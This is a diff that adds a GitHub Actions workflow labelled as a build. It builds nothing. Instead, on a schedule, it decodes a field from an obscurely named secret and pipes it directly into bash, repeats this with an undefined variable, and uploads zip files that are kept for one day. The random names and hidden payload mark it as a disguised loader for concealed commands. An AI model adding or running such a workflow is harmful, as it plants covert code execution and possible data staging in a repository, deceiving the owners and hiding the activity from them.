@@ -1,0 +1,25 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 5,11,17,23 * * *'
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          ba87: ${{ secrets.ba87 }}
+        run: |
+          printf '%s' "$ba87" | jq -r .yt9116 | /bin/bash
+          echo $wthg67 | jq -r .mzrv8245 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: I4LiWQKN
+          path: "*.zip"
+          retention-days: 1
